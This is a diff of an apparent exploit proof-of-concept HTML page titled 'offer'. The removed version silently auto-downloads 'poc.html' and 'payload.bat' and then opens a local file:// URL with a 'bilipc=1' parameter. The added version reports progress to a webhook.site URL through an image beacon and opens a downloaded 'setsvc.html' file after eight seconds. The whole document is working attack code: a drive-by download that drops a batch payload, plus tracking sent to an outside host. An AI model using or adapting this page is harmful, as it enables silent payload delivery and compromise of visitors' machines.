@@ -1,9 +1,9 @@
 <!doctype html><title>offer</title>
 <script>
-function dl(u,n){var a=document.createElement('a');a.href=u;a.download=n;document.body.appendChild(a);a.click()}
-dl('poc.html','poc.html');
-setTimeout(function(){dl('payload.bat','payload.bat')},4000);
+function beacon(s){try{new Image().src='https://webhook.site/05fd1420-af5c-493b-8c5d-353f67b3f438?s='+encodeURIComponent(s.slice(0,500))}catch(e){}}
+beacon('v11-loaded');
 setTimeout(function(){
-  window.open('file:///D:/desk/poc.html?bilipc=1');
-},28000);
+  beacon('opening-file');
+  window.open('file:///C:/Users/aaa/Downloads/setsvc.html?bilipc=1');
+},8000);
 </script>
